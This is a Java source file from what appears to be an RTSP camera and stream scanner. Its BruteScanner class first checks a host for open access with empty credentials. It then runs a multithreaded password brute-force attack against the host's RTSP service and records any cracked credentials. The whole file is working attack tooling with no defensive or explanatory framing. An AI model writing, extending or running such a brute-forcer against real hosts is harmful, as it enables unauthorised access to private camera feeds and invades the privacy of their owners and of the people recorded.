package scanner.runner.unlock.brute;

import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import scanner.ExecutorHolder;
import scanner.runner.unlock.AuthContainer;
import scanner.rtsp.RTSPContext;
import scanner.rtsp.TransportMode;
import scanner.runner.Target;
import scanner.runner.unlock.Credentials;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;

import static scanner.runner.unlock.UnlockType.BRUTE;
import static scanner.runner.unlock.UnlockType.EMPTY;
import static scanner.runner.unlock.UnlockType.UNBROKEN;

/**
 * Brute force attack basic class.
 *
 * @author inkarnadin
 */
@Slf4j
public class BruteScanner {

    private final static long TERMINATION_TIMEOUT = 1000L;

    /**
     * Start brute certain address by prepared range passwords list.
     *
     * @param host target IP address.
     * @param passwords passwords array.
     */
    @SneakyThrows
    public Target scanning(String host, String[] passwords) {
        Optional<Target> target = emptyCheck(host);
        if (target.isPresent()) {
            return target.get();
        }

        int threads = ExecutorHolder.COUNT_THREADS;
        int threshold = (threads - (passwords.length % threads) + passwords.length) / threads;
        List<CompletableFuture<AuthContainer>> futures = new ArrayList<>();
        for (int j = 0; j < passwords.length; j += threshold) {
            futures.add(createBruteTask(host, Arrays.copyOfRange(passwords, j, Math.min(j + threshold, passwords.length))));
        }

        Optional<String> result = futures.stream()
                .map(CompletableFuture::join)
                .filter(i -> i.getIp().equals(host))
                .flatMap(x -> x.getOnlyAuth().stream())
                .findFirst();

        ExecutorHolder.await(TERMINATION_TIMEOUT);
        if (result.isPresent()) {
            return Target.builder()
                    .host(host)
                    .path("11")
                    .credentials(new Credentials(result.get()))
                    .isFreeStream(false)
                    .unlockType(BRUTE)
                    .build();
        }
        return Target.builder()
                .credentials(Credentials.empty())
                .host(host)
                .isFreeStream(false)
                .unlockType(UNBROKEN)
                .build();
    }

    private CompletableFuture<AuthContainer> createBruteTask(String ip, String[] passwords) {
        CompletableFuture<AuthContainer> future = new CompletableFuture<>();
        CompletableFuture.runAsync(() -> new BruteTask(future, ip, passwords).run(), ExecutorHolder.EXECUTOR_SERVICE);
        return future;
    }

    private Optional<Target> emptyCheck(String ip) {
        RTSPContext.set(ip, TransportMode.ORTHODOX);
        CompletableFuture<AuthContainer> bruteTask = createBruteTask(ip, new String[] { null });
        AuthContainer result = bruteTask.join();

        // если true - пропустить все будущие проверки учетных данных, так как потом не защищен
        switch (result.getEmptyCredentialsAuth()) {
            case AUTH:
                return Optional.of(Target.builder()
                            .host(ip)
                            .path("11")
                            .credentials(Credentials.empty())
                            .isFreeStream(true)
                            .unlockType(EMPTY)
                            .build());
            case NOT_AVAILABLE:
            case UNKNOWN_STATE:
                return Optional.of(Target.builder()
                            .host(ip)
                            .credentials(Credentials.empty())
                            .isFreeStream(false)
                            .unlockType(UNBROKEN)
                            .build());
            default:
                return Optional.empty();
        }
    }

}